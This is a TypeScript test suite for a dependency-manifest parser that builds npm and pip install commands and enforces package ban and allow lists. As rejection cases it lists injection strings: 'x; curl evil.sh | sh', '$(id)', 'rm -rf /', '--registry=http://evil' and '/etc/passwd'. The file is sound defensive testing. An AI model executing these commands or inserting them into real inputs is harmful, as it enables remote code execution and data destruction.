import { describe, expect, it } from "vitest";
import { checkDependencyPolicy, packageKey, parseBountiedManifest, parseDependencyPolicy } from "./bountied-manifest";
import { getRuntimeConfig } from "./runtimes";

const manifestOf = (dependencies: unknown) => parseBountiedManifest(JSON.stringify({ dependencies }));
const names = (dependencies: unknown) => manifestOf(dependencies).manifest?.dependencies.map((d) => d.name);

describe("package names are installed exactly as written (lowercased)", () => {
  it("keeps the dots and underscores real packages use", () => {
    expect(names({ "socket.io": "4.7.2", "chart.js": "4.4.0", "lodash.debounce": "4.0.8", "scikit_learn": "1.5.0", "zope.interface": "6.0" })).toEqual([
      "socket.io", "chart.js", "lodash.debounce", "scikit_learn", "zope.interface",
    ]);
  });

  it("keeps scoped npm names intact", () => {
    expect(names({ "@types/node": "20.0.0", "@scope/pkg.name": "1.0.0" })).toEqual(["@types/node", "@scope/pkg.name"]);
  });

  it("lowercases and trims, and nothing else", () => {
    expect(names({ "  Requests  ": "2.31.0", Flask: "" })).toEqual(["requests", "flask"]);
  });

  it("no longer turns socket.io into a different package", () => {
    expect(names({ "socket.io": "" })).not.toContain("socket-io");
  });

  it("accepts the array form too", () => {
    const r = parseBountiedManifest(JSON.stringify({ dependencies: [{ name: "Socket.IO", version: "4.7.2" }] }));
    expect(r.manifest?.dependencies).toEqual([{ name: "socket.io", version: "4.7.2" }]);
  });
});

describe("the install commands use those exact names", () => {
  it("npm installs socket.io, not socket-io", () => {
    const deps = manifestOf({ "socket.io": "4.7.2", "lodash.debounce": "" }).manifest?.dependencies ?? [];
    expect(getRuntimeConfig("NODE").installCommand?.(deps)).toBe("npm install 'socket.io@4.7.2' 'lodash.debounce'");
  });

  it("pip gets the original spelling, which it normalizes itself", () => {
    const deps = manifestOf({ scikit_learn: "1.5.0", "zope.interface": "" }).manifest?.dependencies ?? [];
    expect(getRuntimeConfig("PYTHON").installCommand?.(deps)).toBe("pip install 'scikit_learn==1.5.0' 'zope.interface'");
  });
});

describe("unsafe names are rejected, never cleaned up", () => {
  const unsafe = [
    "--registry=http://evil", "-g", "--prefix=/", "../x", "a/b", "git+https://github.com/x/y", "https://x.test/p.tgz",
    "file:../x", "a b", "x;y", "x|y", "x&y", "$(id)", "`id`", "x\ny", ".hidden", "_x", "-x", "@scope", "@/x", "@scope/", "pkg@1.0.0",
    "x'y", 'x"y', "x*", "x\\y",
  ];
  it.each(unsafe)("rejects %j", (bad) => {
    const r = manifestOf({ [bad]: "1.0.0" });
    expect(r.manifest).toBeNull();
    expect(r.parseError).toMatch(/valid package name/);
  });

  it("never echoes the offending text raw", () => {
    const r = manifestOf({ "x;rm -rf /": "1" });
    expect(r.parseError).not.toContain(";");
    expect(r.parseError).not.toContain(" -rf");
  });

  it("rejects unsafe versions", () => {
    for (const v of ["1.0.0; rm -rf /", "$(id)", "1.0 || 2.0", "git+https://x", "1\n2", "`x`", "a'b"]) {
      expect(manifestOf({ requests: v }).manifest, v).toBeNull();
    }
  });

  it("accepts the version operators pip and npm use", () => {
    for (const v of ["2.31.0", ">=2.0", "~=1.4", "^4.17.21", "~1.2.3", "1.x", "*", "2.0.0-beta.1", "!=1.0", ">=1.0,<2.0"]) {
      expect(manifestOf({ requests: v }).parseError, v).toBeNull();
    }
  });

  it("limits the number of dependencies", () => {
    const many = Object.fromEntries(Array.from({ length: 101 }, (_, i) => [`pkg${i}`, "1.0.0"]));
    expect(manifestOf(many).manifest).toBeNull();
    expect(manifestOf(Object.fromEntries(Array.from({ length: 100 }, (_, i) => [`pkg${i}`, "1.0.0"]))).parseError).toBeNull();
  });
});

describe("entrypoint and mode", () => {
  it("accepts a plain relative path and a known mode", () => {
    const r = parseBountiedManifest(JSON.stringify({ entrypoint: "src/main.py", executionMode: "run" }));
    expect(r.manifest?.entrypoint).toBe("src/main.py");
    expect(r.manifest?.executionMode).toBe("run");
  });

  it("rejects an entrypoint that could be a command or an option", () => {
    for (const e of ["x; curl evil.sh | sh", "-rf", "/etc/passwd", "a b.py", "$(id).py", "x\n.py"]) {
      expect(parseBountiedManifest(JSON.stringify({ entrypoint: e })).manifest, e).toBeNull();
    }
  });

  it("rejects an unknown execution mode", () => {
    expect(parseBountiedManifest(JSON.stringify({ executionMode: "rm -rf /" })).manifest).toBeNull();
  });

  it("rejects a top-level list instead of silently dropping its packages", () => {
    const r = parseBountiedManifest(JSON.stringify([{ name: "requests", version: "2.31.0" }]));
    expect(r.manifest).toBeNull();
    expect(r.parseError).toMatch(/JSON object/);
  });

  it("rejects text that isn't a JSON object", () => {
    for (const t of ["", "{ nope", "[]", "5", "null", '"x"']) {
      expect(parseBountiedManifest(t).manifest, t).toBeNull();
    }
  });
});

describe("packageKey", () => {
  it("treats - _ . as the same, the way pip does", () => {
    expect(packageKey("Scikit_Learn")).toBe("scikit-learn");
    expect(packageKey("zope.interface")).toBe("zope-interface");
    expect(packageKey("a__b..c")).toBe("a-b-c");
  });
});

describe("dependency policy", () => {
  const text = (deps: Record<string, string>) => JSON.stringify({ dependencies: deps });

  it("reads and lowercases the Giver's lists, ignoring junk", () => {
    expect(parseDependencyPolicy({ bannedPackages: ["Requests", "", 5, "  Flask "], maxDependencies: 3.9 })).toEqual({
      bannedPackages: ["requests", "flask"],
      maxDependencies: 3,
    });
    expect(parseDependencyPolicy(null)).toBeNull();
    expect(parseDependencyPolicy({})).toBeNull();
    expect(parseDependencyPolicy("x")).toBeNull();
  });

  it("a ban can't be dodged by respelling, on either runtime", () => {
    const policy = parseDependencyPolicy({ bannedPackages: ["scikit-learn"] });
    for (const runtime of ["PYTHON", "NODE"] as const) {
      expect(checkDependencyPolicy(policy, text({ scikit_learn: "1" }), runtime).ok, runtime).toBe(false);
      expect(checkDependencyPolicy(policy, text({ "Scikit.Learn": "1" }), runtime).ok, runtime).toBe(false);
    }
  });

  it("a ban on a dotted Node package also catches its dashed look-alike (over-matching is the safe side)", () => {
    const policy = parseDependencyPolicy({ bannedPackages: ["socket.io"] });
    expect(checkDependencyPolicy(policy, text({ "socket.io": "4" }), "NODE").ok).toBe(false);
    expect(checkDependencyPolicy(policy, text({ "socket-io": "4" }), "NODE").ok).toBe(false);
  });

  it("an allow list on Python ignores spelling, as pip does", () => {
    const policy = parseDependencyPolicy({ allowedPackages: ["scikit-learn", "numpy"] });
    expect(checkDependencyPolicy(policy, text({ scikit_learn: "1", numpy: "" }), "PYTHON").ok).toBe(true);
  });

  it("an allow list on Node is exact: allowing socket.io does not allow socket-io", () => {
    const policy = parseDependencyPolicy({ allowedPackages: ["socket.io"] });
    expect(checkDependencyPolicy(policy, text({ "socket.io": "4" }), "NODE").ok).toBe(true);
    const sneaky = checkDependencyPolicy(policy, text({ "socket-io": "4" }), "NODE");
    expect(sneaky.ok).toBe(false);
    expect(sneaky.offendingPackages).toEqual(["socket-io"]);
  });

  it("an allow list on Node doesn't let a differently-spelled package through either way round", () => {
    const policy = parseDependencyPolicy({ allowedPackages: ["lodash-debounce"] });
    expect(checkDependencyPolicy(policy, text({ "lodash.debounce": "4" }), "NODE").ok).toBe(false);
  });

  it("with no policy everything is allowed, and the names come back", () => {
    const r = checkDependencyPolicy(null, text({ "socket.io": "4" }), "NODE");
    expect(r.ok).toBe(true);
    expect((r as { packageNames?: string[] }).packageNames).toEqual(["socket.io"]);
  });

  it("enforces the maximum count", () => {
    const policy = parseDependencyPolicy({ maxDependencies: 1 });
    expect(checkDependencyPolicy(policy, text({ a: "1" })).ok).toBe(true);
    expect(checkDependencyPolicy(policy, text({ a: "1", b: "1" })).ok).toBe(false);
  });

  it("fails closed when a restricted problem's bountied.json can't be read", () => {
    const policy = parseDependencyPolicy({ bannedPackages: ["x"] });
    const r = checkDependencyPolicy(policy, "{ not json");
    expect(r.ok).toBe(false);
    expect(r.reason).toMatch(/couldn't be verified/);
  });

  it("treats a missing bountied.json as zero dependencies", () => {
    const policy = parseDependencyPolicy({ bannedPackages: ["x"] });
    expect(checkDependencyPolicy(policy, null).ok).toBe(true);
  });
});
